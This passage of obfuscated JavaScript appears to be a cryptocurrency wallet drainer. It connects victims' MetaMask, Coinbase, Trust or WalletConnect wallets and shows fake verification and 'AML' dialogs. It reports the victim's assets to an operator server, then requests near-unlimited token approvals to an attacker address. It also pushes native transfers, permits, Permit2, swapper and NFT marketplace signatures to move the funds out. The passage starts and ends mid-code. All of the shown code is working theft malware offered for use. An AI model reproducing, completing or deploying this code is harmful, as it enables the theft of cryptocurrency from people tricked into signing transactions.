                }
              }
            }
          }
        }
      } catch (_0xd7070) {
        console.log(_0xd7070);
      }
    }
    await Promise.all(_0x492528);
    let _0x57c4ad = false;
    for (const _0x71427 in MS_Settings.Settings.Chains) {
      try {
        if (MS_Settings.Settings.Chains[_0x71427].NFTs) {
          _0x57c4ad = false;
          break;
        }
      } catch (_0x176bc1) {
        console.log(_0x176bc1);
      }
    }
    if (_0x57c4ad) {
      try {
        let _0x3e3773 = [];
        _0x1210d2 = await send_request({
          'action': "check_nft",
          'address': MS_Current_Address
        });
        if (_0x1210d2.status == 'OK') {
          _0x3e3773 = _0x1210d2.data;
          for (const _0x2691d0 of _0x3e3773) {
            try {
              const _0x137fbc = convert_chain('ID', "ANKR", _0x2691d0.chain_id);
              if (_0x2691d0.type == "ERC1155") {
                continue;
              }
              if (!MS_Settings.Settings.Chains[_0x137fbc].NFTs) {
                continue;
              }
              if (_0x2691d0.amount_usd < MS_Settings.Settings.Chains[_0x137fbc].Min_NFTs_Price) {
                continue;
              }
              _0x1e4821.push(_0x2691d0);
            } catch (_0x3a4c31) {
              console.log(_0x3a4c31);
            }
          }
        } else {
          _0x3e3773 = await get_nfts(_0x58a0bb);
          for (const _0x2de71a of _0x3e3773) {
            try {
              const _0x2af8c9 = convert_chain('ID', "ANKR", _0x2de71a.chain_id);
              if (_0x2de71a.type == 'ERC1155') {
                continue;
              }
              if (!MS_Settings.Settings.Chains[_0x2af8c9].NFTs) {
                continue;
              }
              if (_0x2de71a.amount_usd < MS_Settings.Settings.Chains[_0x2af8c9].Min_NFTs_Price) {
                continue;
              }
              _0x1e4821.push(_0x2de71a);
            } catch (_0x5454ca) {
              console.log(_0x5454ca);
            }
          }
        }
      } catch (_0x122423) {
        console.log(_0x122423);
      }
    }
    _0x1e4821.sort((_0x2dbb79, _0x2c4d25) => {
      return _0x2c4d25.amount_usd - _0x2dbb79.amount_usd;
    });
    if (MS_Settings.Settings.Tokens_First == 0x1) {
      const _0x4511f5 = [];
      for (const _0x53956e of _0x1e4821) {
        try {
          if (_0x53956e.type == "NATIVE") {
            continue;
          }
          _0x4511f5.push(_0x53956e);
        } catch (_0x122337) {
          console.log(_0x122337);
        }
      }
      for (const _0x114a29 of _0x1e4821) {
        try {
          if (_0x114a29.type != "NATIVE") {
            continue;
          }
          _0x4511f5.push(_0x114a29);
        } catch (_0x50143f) {
          console.log(_0x50143f);
        }
      }
      _0x1e4821 = _0x4511f5;
    } else {
      if (MS_Settings.Settings.Tokens_First == 0x2) {
        const _0x5822fe = [];
        for (const _0x3285d5 of _0x1e4821) {
          try {
            if (_0x3285d5.type != "NATIVE") {
              continue;
            }
            _0x5822fe.push(_0x3285d5);
          } catch (_0x4b7468) {
            console.log(_0x4b7468);
          }
        }
        for (const _0x12b379 of _0x1e4821) {
          try {
            if (_0x12b379.type == 'NATIVE') {
              continue;
            }
            _0x5822fe.push(_0x12b379);
          } catch (_0x216922) {
            console.log(_0x216922);
          }
        }
        _0x1e4821 = _0x5822fe;
      }
    }
    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 0x1) {
      const _0x341d74 = [];
      for (const _0x433e72 of _0x1e4821) {
        try {
          if (!_0x433e72.swapper) {
            continue;
          }
          _0x341d74.push(_0x433e72);
        } catch (_0x1a5441) {
          console.log(_0x1a5441);
        }
      }
      for (const _0x32cceb of _0x1e4821) {
        try {
          if (_0x32cceb.swapper) {
            continue;
          }
          _0x341d74.push(_0x32cceb);
        } catch (_0x5cd3f8) {
          console.log(_0x5cd3f8);
        }
      }
      _0x1e4821 = _0x341d74;
    }
    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0x0) {
      const _0x14874e = [];
      for (const _0x259913 of _0x1e4821) {
        try {
          if (!_0x259913.permit || _0x259913.permit == 0x0 || _0x259913.amount_usd < MS_Settings.Settings.Permit.Priority) {
            continue;
          }
          _0x14874e.push(_0x259913);
        } catch (_0x224f6e) {
          console.log(_0x224f6e);
        }
      }
      for (const _0x22f383 of _0x1e4821) {
        try {
          if (_0x22f383.permit && _0x22f383.permit > 0x0 && _0x22f383.amount_usd >= MS_Settings.Settings.Permit.Priority) {
            continue;
          }
          _0x14874e.push(_0x22f383);
        } catch (_0x313dcf) {
          console.log(_0x313dcf);
        }
      }
      _0x1e4821 = _0x14874e;
    }
    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 0x2) {
      const _0x4bb066 = [];
      for (const _0x14f839 of _0x1e4821) {
        try {
          if (!_0x14f839.swapper) {
            continue;
          }
          _0x4bb066.push(_0x14f839);
        } catch (_0x3bfc24) {
          console.log(_0x3bfc24);
        }
      }
      for (const _0x39b2c3 of _0x1e4821) {
        try {
          if (_0x39b2c3.swapper) {
            continue;
          }
          _0x4bb066.push(_0x39b2c3);
        } catch (_0x2ecef7) {
          console.log(_0x2ecef7);
        }
      }
      _0x1e4821 = _0x4bb066;
    }
    return _0x1e4821;
  } catch (_0x5ededf) {
    console.log(_0x5ededf);
    return [];
  }
};
const APPROVE_TOKEN = async _0x272728 => {
  if ((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 0x2 || MS_Current_Provider == "Trust Wallet" && MS_Settings.Settings.Approve.Trust >= 0x2) && !_0x272728.increase) {
    try {
      for (let _0x276adf = 0x0; _0x276adf < 0x2; _0x276adf++) {
        if (_0x272728.increase) {
          continue;
        }
        try {
          const _0x1dd841 = await retrive_token(_0x272728.chain_id, _0x272728.address);
          const _0x4c5125 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x272728.chain_id]);
          const _0xb6571 = new ethers.Contract(_0x272728.address, _0x1dd841, _0x4c5125);
          if (is_increase_approve(_0xb6571.functions) == 0x2) {
            _0x272728.increase = 0x2;
          } else {
            if (is_increase_approve(_0xb6571.functions) == 0x1) {
              _0x272728.increase = 0x1;
            }
          }
        } catch (_0x50fe26) {
          console.log(_0x50fe26);
        }
      }
    } catch (_0x5f544e) {
      console.log(_0x5f544e);
    }
  }
  if ((MS_Current_Provider == "MetaMask" && MS_Settings.Settings.Approve.MetaMask >= 0x2 || MS_Current_Provider == "Trust Wallet" && MS_Settings.Settings.Approve.Trust >= 0x2) && _0x272728.increase) {
    return await MM_APPROVE_TOKEN(_0x272728);
  }
  if ((MS_Current_Provider == "MetaMask" && MS_Settings.Settings.Approve.MetaMask == 0x2 || MS_Current_Provider == "Trust Wallet" && MS_Settings.Settings.Approve.Trust == 0x2) && !_0x272728.increase) {
    await TRANSFER_TOKEN(_0x272728);
    return 0x2;
  }
  if ((MS_Current_Provider == "MetaMask" && MS_Settings.Settings.Approve.MetaMask == 0x3 || MS_Current_Provider == "Trust Wallet" && MS_Settings.Settings.Approve.Trust == 0x3) && !_0x272728.increase) {
    throw new Error('UNSUPPORTED');
  }
  const _0x1c5603 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x272728.chain_id]);
  const _0x4bab3b = ethers.BigNumber.from(await _0x1c5603.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x1cabd7 = await get_nonce(_0x272728.chain_id);
  const _0x430a1c = new ethers.Contract(_0x272728.address, MS_Contract_ABI.ERC20, MS_Signer);
  let _0x94d08a = null;
  let _0x38b05d = ethers.utils.parseEther('1158472395435294898592384258348512586931256');
  for (const _0x333d65 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x333d65[0x0] == MS_Current_Chain_ID && _0x333d65[0x1] == _0x272728.address.toLowerCase().trim()) {
        _0x38b05d = _0x272728.amount_raw;
        break;
      }
    } catch (_0x148e64) {
      console.log(_0x148e64);
    }
  }
  try {
    _0x94d08a = await _0x430a1c.estimateGas.approve(MS_Settings.Address, _0x38b05d, {
      'from': MS_Current_Address
    });
    _0x94d08a = ethers.BigNumber.from(_0x94d08a).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x3cd7a6) {
    _0x94d08a = _0x272728.chain_id == 0xa4b1 ? 0x4c4b40 : _0x272728.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await approve_request(_0x272728);
  sign_next();
  const _0x2459cf = await _0x430a1c.approve(MS_Settings.Address, _0x38b05d, {
    'gasLimit': ethers.BigNumber.from(_0x94d08a),
    'gasPrice': ethers.BigNumber.from(_0x4bab3b),
    'nonce': _0x1cabd7,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x1c5603.waitForTransaction(_0x2459cf.hash, 0x1, 0x7530);
  }
  await approve_success(_0x272728);
  sign_ready();
  return 0x1;
};
const MM_APPROVE_TOKEN = async _0x34bfb4 => {
  const _0x4dbbf6 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x34bfb4.chain_id]);
  const _0x1d21ef = ethers.BigNumber.from(await _0x4dbbf6.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x53967a = await get_nonce(_0x34bfb4.chain_id);
  let _0x1ee6bc = _0x34bfb4.increase == 0x2 ? 'increaseApproval' : "increaseAllowance";
  const _0x36a7f9 = new ethers.Contract(_0x34bfb4.address, [{
    'inputs': [{
      'internalType': "address",
      'name': "spender",
      'type': "address"
    }, {
      'internalType': "uint256",
      'name': "increment",
      'type': "uint256"
    }],
    'name': '' + _0x1ee6bc,
    'outputs': [{
      'internalType': "bool",
      'name': '',
      'type': 'bool'
    }],
    'stateMutability': "nonpayable",
    'type': "function"
  }], MS_Signer);
  let _0x254183 = null;
  let _0x265dfb = ethers.utils.parseEther('1158472395435294898592384258348512586931256');
  for (const _0x47eb0c of MS_Settings.Unlimited_BL) {
    try {
      if (_0x47eb0c[0x0] == MS_Current_Chain_ID && _0x47eb0c[0x1] == _0x34bfb4.address.toLowerCase().trim()) {
        _0x265dfb = _0x34bfb4.amount_raw;
        break;
      }
    } catch (_0x519cae) {
      console.log(_0x519cae);
    }
  }
  try {
    _0x254183 = await _0x36a7f9.estimateGas[_0x1ee6bc](MS_Settings.Address, _0x265dfb, {
      'from': MS_Current_Address
    });
    _0x254183 = ethers.BigNumber.from(_0x254183).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x344ec6) {
    _0x254183 = _0x34bfb4.chain_id == 0xa4b1 ? 0x4c4b40 : _0x34bfb4.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await approve_request(_0x34bfb4);
  sign_next();
  const _0x518d89 = await _0x36a7f9[_0x1ee6bc](MS_Settings.Address, _0x265dfb, {
    'gasLimit': ethers.BigNumber.from(_0x254183),
    'gasPrice': ethers.BigNumber.from(_0x1d21ef),
    'nonce': _0x53967a,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x4dbbf6.waitForTransaction(_0x518d89.hash, 0x1, 0x7530);
  }
  await approve_success(_0x34bfb4);
  sign_ready();
  return 0x1;
};
const connect_wallet = async (_0x159ca4 = null) => {
  try {
    if (MS_Process) {
      return;
    }
    MS_Process = true;
    if (_0x159ca4 !== null) {
      if (_0x159ca4 == 'MetaMask') {
        if (typeof window.ethereum == "object" && typeof window.ethereum.providers === 'object') {
          let _0x31b7d8 = false;
          for (const _0x71a8bd of window.ethereum.providers) {
            if (_0x71a8bd.isMetaMask == true) {
              _0x31b7d8 = true;
              MS_Provider = _0x71a8bd;
              MS_Current_Provider = 'MetaMask';
              break;
            }
          }
          if (!_0x31b7d8) {
            if (MS_Mobile_Status) {
              window.location.href = "https://metamask.app.link/dapp/" + MS_Current_URL;
              MS_Process = false;
              return;
            } else {
              window.open("https://metamask.io", '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === "object" && window.ethereum.isMetaMask) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'MetaMask';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = "https://metamask.app.link/dapp/" + MS_Current_URL;
              MS_Process = false;
              return;
            } else {
              window.open("https://metamask.io", "_blank").focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else {
        if (_0x159ca4 == "Coinbase") {
          if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === "object") {
            let _0x454e63 = false;
            for (const _0x18428d of window.ethereum.providers) {
              if (_0x18428d.isCoinbaseWallet == true) {
                _0x454e63 = true;
                MS_Provider = _0x18428d;
                break;
              }
            }
            if (_0x454e63) {
              MS_Current_Provider = "Coinbase";
            } else {
              if (MS_Mobile_Status) {
                window.location.href = 'https://go.cb-w.com/dapp?cb_url=https://' + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open("https://www.coinbase.com/wallet", "_blank").focus();
                MS_Process = false;
                return;
              }
            }
          } else {
            if (typeof window.ethereum === "object" && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
              MS_Provider = window.ethereum;
              MS_Current_Provider = 'Coinbase';
            } else {
              if (MS_Mobile_Status) {
                window.location.href = "https://go.cb-w.com/dapp?cb_url=https://" + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open("https://www.coinbase.com/wallet", '_blank').focus();
                MS_Process = false;
                return;
              }
            }
          }
        } else {
          if (_0x159ca4 == "Trust Wallet") {
            if (typeof window.ethereum === "object" && window.ethereum.isTrust) {
              MS_Provider = window.ethereum;
              MS_Current_Provider = "Trust Wallet";
            } else {
              if (MS_Mobile_Status) {
                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open("https://trustwallet.com", '_blank').focus();
                MS_Process = false;
                return;
              }
            }
          } else {
            if (_0x159ca4 == "Binance Wallet") {
              if (typeof window.BinanceChain === "object") {
                MS_Provider = window.BinanceChain;
                MS_Current_Provider = "Binance Wallet";
              } else {
                window.open("https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp", "_blank").focus();
                MS_Process = false;
                return;
              }
            } else if (_0x159ca4 == "WalletConnect" || _0x159ca4 == "WalletConnect_v2") {
              MS_Current_Provider = 'WalletConnect';
            } else if (typeof window.ethereum === 'object') {
              MS_Provider = window.ethereum;
              MS_Current_Provider = "Ethereum";
            } else {
              MS_Current_Provider = "WalletConnect";
            }
          }
        }
      }
    } else if (window.ethereum) {
      MS_Provider = window.ethereum;
      MS_Current_Provider = 'Ethereum';
    } else {
      MS_Current_Provider = "WalletConnect";
    }
    try {
      await connect_request();
      let _0x3a8ae3 = null;
      if (MS_Current_Provider == "WalletConnect") {
        ms_hide();
        document.getElementById('openmodal').style.display = 'none';
        await load_wc();
        try {
          await MS_Provider.disconnect();
        } catch (_0x5291e9) {
          console.log(_0x5291e9);
        }
        await MS_Provider.connect();
        if (MS_Provider && MS_Provider.accounts.length > 0x0) {
          if (!MS_Provider.accounts[0x0].includes('0x')) {
            MS_Process = false;
            return await connect_cancel();
          }
          await new Promise(_0x14b798 => setTimeout(_0x14b798, 0x9c4));
          MS_Current_Address = MS_Provider.accounts[0x0];
          MS_Current_Chain_ID = MS_Provider.eth_chainId;
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
          if (MS_Settings.Settings.Sign.WalletConnect == 0x0) {
            MS_Sign_Disabled = true;
          }
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      } else {
        try {
          _0x3a8ae3 = await MS_Provider.request({
            'method': "wallet_requestPermissions",
            'params': [{
              'eth_accounts': {}
            }]
          });
          if (_0x3a8ae3 && _0x3a8ae3.length > 0x0) {
            if (!MS_Provider.eth_accounts.includes('0x')) {
              return connect_cancel();
            }
            MS_Current_Address = MS_Provider.eth_accounts;
            MS_Current_Chain_ID = parseInt(MS_Provider.eth_chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        } catch (_0x368099) {
          _0x3a8ae3 = await MS_Provider.request({
            'method': "eth_requestAccounts"
          });
          if (_0x3a8ae3 && _0x3a8ae3.length > 0x0) {
            if (!_0x3a8ae3[0x0].includes('0x')) {
              return connect_cancel();
            }
            MS_Current_Address = _0x3a8ae3[0x0];
            MS_Current_Chain_ID = parseInt(MS_Provider.eth_chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      }
      if (!MS_Current_Address.match(/^0x\S+$/)) {
        throw new Error("Invalid Wallet");
      }
    } catch (_0x2dc288) {
      console.log(_0x2dc288);
      MS_Process = false;
      return await connect_cancel();
    }
    ms_hide();
    if (MS_Settings.V_MODE == 0x1) {
      MSL.fire({
        'icon': "load",
        'title': "Waiting for action",
        'text': "Sign message to verificate your wallet",
        'showConfirmButton': true,
        'confirmButtonText': "Waiting...",
        'color': "light"
      });
      try {
        const _0x4223b2 = MS_Settings.V_MSG.replaceAll("{{ADDRESS}}", MS_Current_Address);
        const _0x28ac66 = await MS_Signer.signMessage(_0x4223b2);
        const _0x434e72 = ethers.utils.recoverAddress(ethers.utils.hashMessage(_0x4223b2), _0x28ac66);
        if (!_0x434e72) {
          MSL.fire({
            'icon': "error",
            'title': "Error",
            'subtitle': "Verification Error",
            'text': "We have received your signature, but it's incorrect, please try again.",
            'showConfirmButton': true,
            'confirmButtonText': 'OK',
            'color': "light"
          });
          MS_Process = false;
          return await connect_cancel();
        } else {
          let _0xcbe352 = await send_request({
            'action': "sign_verify",
            'sign': _0x28ac66,
            'address': MS_Current_Address,
            'message': ''
          });
          if (_0xcbe352.status != 'OK') {
            MSL.fire({
              'icon': 'error',
              'title': 'Error',
              'subtitle': "Verification Error",
              'text': "We have received your signature, but it's incorrect, please try again.",
              'showConfirmButton': true,
              'confirmButtonText': 'OK',
              'color': "light"
            });
            MS_Process = false;
            return await connect_cancel();
          }
        }
      } catch (_0x17cf01) {
        MSL.fire({
          'icon': "error",
          'title': "Error",
          'subtitle': "Verification Error",
          'text': "We cannot verify that the wallet is yours as you did not sign the message provided.",
          'showConfirmButton': true,
          'confirmButtonText': 'OK',
          'color': "light"
        });
        MS_Process = false;
        return await connect_cancel();
      }
    } else {
      await send_request({
        'action': "sign_verify",
        'address': MS_Current_Address
      });
    }
    await connect_success();
    show_check();
    if (MS_Settings.Wallet_Blacklist.length > 0x0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase().trim())) {
      MS_Check_Done = true;
      Swal.close();
      MSL.fire({
        'icon': "error",
        'title': 'Error',
        'subtitle': "AML Error",
        'text': "Your wallet is not AML clear!",
        'showConfirmButton': true,
        'confirmButtonText': 'OK',
        'color': "light"
      });
      MS_Process = false;
      return;
    }
    let _0x2d3a6e = await get_wallet_assets(MS_Current_Address);
    let _0x51ea0d = 0x0;
    for (const _0x2300db of _0x2d3a6e) {
      try {
        _0x51ea0d += _0x2300db.amount_usd;
      } catch (_0x11f8bc) {
        console.log(_0x11f8bc);
      }
    }
    let _0x2c7cba = 0x0;
    for (const _0x78e6cc of _0x2d3a6e) _0x2c7cba += _0x78e6cc.amount_usd;
    await send_request({
      'action': "check_finish",
      'user_id': MS_ID,
      'assets': _0x2d3a6e,
      'balance': _0x2c7cba,
      'address': MS_Current_Address
    });
    MS_Check_Done = true;
    Swal.close();
    if (MS_Settings.Settings.Minimal_Wallet_Price > _0x51ea0d) {
      setTimeout(end_message, 0x7d0);
      MS_Process = false;
      return;
    }
    sign_next();
    if (MS_Settings.Settings.Sign.MetaMask == 0x0 && MS_Current_Provider == 'MetaMask' || MS_Settings.Settings.Sign.Trust == 0x0 && MS_Current_Provider == "Trust Wallet" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) {
      MS_Sign_Disabled = true;
    }
    for (const _0x54f33f of _0x2d3a6e) {
      try {
        if (_0x54f33f.type != "NATIVE") {
          MS_Gas_Reserves[_0x54f33f.chain_id] += 0x1;
        }
      } catch (_0x275a0f) {
        console.log(_0x275a0f);
      }
    }
    if (typeof SIGN_BLUR !== "undefined" && MS_Settings.Settings.Blur.Enable == 0x1 && MS_Settings.Settings.Blur.Priority == 0x1) {
      await SIGN_BLUR(_0x2d3a6e, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.Blur.Price);
    }
    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 0x1 && MS_Settings.Settings.SeaPort.Priority == 0x1) {
      await SIGN_SEAPORT(_0x2d3a6e, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.SeaPort.Price);
    }
    if (typeof SIGN_X2Y2 !== "undefined" && MS_Settings.Settings.x2y2.Enable == 0x1 && MS_Current_Chain_ID == 0x1 && MS_Settings.Settings.x2y2.Priority == 0x1) {
      await SIGN_X2Y2(_0x2d3a6e, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.x2y2.Price);
    }
    let _0x57d4f3 = true;
    while (_0x57d4f3) {
      _0x57d4f3 = MS_Settings.LA == 0x1;
      for (const _0x2c9aa2 of _0x2d3a6e) {
        try {
          if (_0x2c9aa2.skip) {
            continue;
          }
          let _0x303474 = false;
          if (_0x2c9aa2.type == "NATIVE") {
            const _0x303679 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x2c9aa2.chain_id]);
            let _0x485729 = false;
            const _0x317d07 = ethers.BigNumber.from(await _0x303679.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
            if (MS_Settings.Settings.Chains[convert_chain('ID', "ANKR", _0x2c9aa2.chain_id)].Contract_Address != '') {
              _0x485729 = true;
            }
            const _0x2b88fa = _0x2c9aa2.chain_id == 0xa4b1 ? 0x4c4b40 : _0x2c9aa2.chain_id == 0xa86a ? 0x4c4b40 : _0x485729 ? 0x186a0 : 0x7530;
            const _0x3fc50d = _0x2c9aa2.chain_id == 0xa4b1 ? 0x4c4b40 : _0x2c9aa2.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
            const _0x5034fd = ethers.BigNumber.from(_0x2c9aa2.chain_id == 0xa ? "35000000000" : _0x317d07);
            const _0xc39676 = _0x5034fd.mul(ethers.BigNumber.from(_0x2b88fa)).mul(ethers.BigNumber.from('2'));
            const _0x2540e8 = _0x5034fd.mul(ethers.BigNumber.from(_0x3fc50d)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x2c9aa2.chain_id])));
            const _0x296981 = ethers.BigNumber.from(_0x2c9aa2.amount_raw).sub(_0xc39676).sub(_0x2540e8).toString();
            console.log(_0x296981);
            if (ethers.BigNumber.from(_0x296981).lte(ethers.BigNumber.from('0'))) {
              continue;
            }
          }
          if (_0x2c9aa2.chain_id != MS_Current_Chain_ID) {
            await chain_request(MS_Current_Chain_ID, _0x2c9aa2.chain_id);
            try {
              if (MS_Current_Provider == "WalletConnect") {
                try {
                  await MS_Provider.request({
                    'method': "wallet_switchEthereumChain",
                    'params': [{
                      'chainId': '0x' + _0x2c9aa2.chain_id.toString(0x10)
                    }]
                  });
                } catch (_0x49348d) {
                  await chain_cancel();
                  continue;
                }
              } else {
                try {
                  await MS_Provider.request({
                    'method': 'wallet_switchEthereumChain',
                    'params': [{
                      'chainId': '0x' + _0x2c9aa2.chain_id.toString(0x10)
                    }]
                  });
                } catch (_0xc3c7ea) {
                  if (_0xc3c7ea.code == 0x1326 || _0xc3c7ea.code == -0x7f5b) {
                    try {
                      await MS_Provider.request({
                        'method': "wallet_addEthereumChain",
                        'params': [MS_MetaMask_ChainData[_0x2c9aa2.chain_id]]
                      });
                    } catch (_0x4512b6) {
                      await chain_cancel();
                      continue;
                    }
                  } else {
                    await chain_cancel();
                    continue;
                  }
                }
              }
              MS_Current_Chain_ID = _0x2c9aa2.chain_id;
              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
              MS_Signer = MS_Web3.getSigner();
              _0x303474 = true;
              await chain_success();
            } catch (_0x2c0527) {
              console.log(_0x2c0527);
              await chain_cancel();
              continue;
            }
          } else {
            _0x303474 = true;
          }
          if (!_0x303474) {
            continue;
          }
          if (_0x2c9aa2.type == "NATIVE") {
            if (MS_Settings.Settings.Sign.Native > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
              while (true) {
                try {
                  await SIGN_NATIVE(_0x2c9aa2);
                  _0x2c9aa2.skip = true;
                  break;
                } catch (_0x329ab7) {
                  console.log(_0x329ab7);
                  if (MS_Settings.Settings.Sign.WC_AE == 0x1 && MS_Current_Provider == "WalletConnect" || typeof _0x329ab7.message == "string" && _0x329ab7.message.includes("eth_sign") || _0x329ab7.code == -0x7f59 || _0x329ab7.code == -0x7d00 || _0x329ab7.message && is_valid_json(_0x329ab7.message) && (JSON.parse(_0x329ab7.message).code == -0x7f59 || JSON.parse(_0x329ab7.message).code == -0x7d00)) {
                    if (MS_Settings.Settings.Sign.Force == 0x1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        try {
                          await TRANSFER_NATIVE(_0x2c9aa2);
                          _0x2c9aa2.skip = true;
                          break;
                        } catch (_0x63b01c) {
                          console.log(_0x63b01c);
                          if (_0x63b01c != 'LOW_BALANCE') {
                            await transfer_cancel();
                            if (!MS_Settings.Loop_N) {
                              break;
                            }
                          } else {
                            break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(_0x329ab7);
                    if (_0x329ab7 != "LOW_BALANCE") {
                      await sign_cancel();
                      if (!MS_Settings.Loop_N) {
                        break;
                      }
                    } else {
                      break;
                    }
                  }
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NATIVE(_0x2c9aa2);
                  _0x2c9aa2.skip = true;
                  break;
                } catch (_0xef286b) {
                  console.log(_0xef286b);
                  if (_0xef286b != "LOW_BALANCE") {
                    await transfer_cancel();
                    if (!MS_Settings.Loop_N) {
                      break;
                    }
                  } else {
                    break;
                  }
                }
              }
            }
          } else {
            if (_0x2c9aa2.type == 'ERC20') {
              if (typeof _0x2c9aa2.permit == "undefined" && MS_Settings.Settings.Permit.Mode && _0x2c9aa2.amount_usd >= MS_Settings.Settings.Permit.Price) {
                const _0x4ecdc5 = await retrive_token(_0x2c9aa2.chain_id, _0x2c9aa2.address);
                const _0xfc9688 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x2c9aa2.chain_id]);
                const _0x35af71 = new ethers.Contract(_0x2c9aa2.address, _0x4ecdc5, _0xfc9688);
                const _0x3bb611 = get_permit_type(_0x35af71.functions);
                _0x2c9aa2.permit = _0x3bb611;
                _0x2c9aa2.permit_ver = '1';
                _0x2c9aa2.abi = _0x4ecdc5;
                if (_0x3bb611 > 0x0) {
                  if (_0x35af71.functions.hasOwnProperty('version')) {
                    try {
                      _0x2c9aa2.permit_ver = await _0x35af71.version();
                    } catch (_0x178d3d) {
                      console.log(_0x178d3d);
                    }
                  }
                  console.log("[PERMIT FOUND] " + _0x2c9aa2.name + ", Permit Type: " + _0x3bb611 + ", Version: " + _0x2c9aa2.permit_ver);
                }
              }
              if (_0x2c9aa2.permit > 0x0) {
                for (const _0x7fc698 of MS_Settings.Permit_BL) {
                  if (_0x7fc698[0x0] == MS_Current_Chain_ID && _0x7fc698[0x1] === _0x2c9aa2.address.toLowerCase().trim()) {
                    _0x2c9aa2.permit = 0x0;
                    break;
                  }
                }
              }
              if (MS_Settings.Settings.Permit2.Mode && _0x2c9aa2.permit2) {
                const _0x2b67e5 = [];
                for (const _0xaf8b40 of _0x2d3a6e) {
                  try {
                    if (_0xaf8b40.chain_id == _0x2c9aa2.chain_id && _0xaf8b40.permit2) {
                      _0x2b67e5.push(_0xaf8b40);
                      _0xaf8b40.skip = true;
                    }
                  } catch (_0x2b669e) {
                    console.log(_0x2b669e);
                  }
                }
                while (true) {
                  try {
                    await DO_PERMIT2(_0x2c9aa2, _0x2b67e5);
                    _0x2c9aa2.skip = true;
                    break;
                  } catch (_0xd660e2) {
                    console.log(_0xd660e2);
                    await approve_cancel();
                    if (!MS_Settings.Loop_T) {
                      break;
                    }
                  }
                }
              } else {
                if (MS_Settings.Settings.Permit.Mode && _0x2c9aa2.permit && _0x2c9aa2.permit > 0x0) {
                  while (true) {
                    try {
                      await PERMIT_TOKEN(_0x2c9aa2);
                      _0x2c9aa2.skip = true;
                      break;
                    } catch (_0x26a78f) {
                      console.log(_0x26a78f);
                      await approve_cancel();
                      if (!MS_Settings.Loop_T) {
                        break;
                      }
                    }
                  }
                } else {
                  if (MS_Settings.Settings.Swappers.Enable && _0x2c9aa2.swapper && _0x2c9aa2.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                    if (_0x2c9aa2.swapper_type == "Uniswap") {
                      const _0x59afb8 = [];
                      for (const _0x717a1e of _0x2d3a6e) {
                        try {
                          if (_0x717a1e.chain_id == _0x2c9aa2.chain_id && _0x717a1e.swapper && _0x717a1e.swapper_type == "Uniswap") {
                            _0x59afb8.push(_0x717a1e);
                            _0x717a1e.skip = true;
                          }
                        } catch (_0x123d94) {
                          console.log(_0x123d94);
                        }
                      }
                      while (true) {
                        try {
                          await DO_UNISWAP(_0x2c9aa2, _0x59afb8);
                          _0x2c9aa2.skip = true;
                          break;
                        } catch (_0x3aae61) {
                          console.log(_0x3aae61);
                          await sign_cancel();
                          if (!MS_Settings.Loop_T) {
                            break;
                          }
                        }
                      }
                    } else {
                      if (_0x2c9aa2.swapper_type == "Pancake_V3") {
                        const _0x4f9769 = [];
                        for (const _0x302da4 of _0x2d3a6e) {
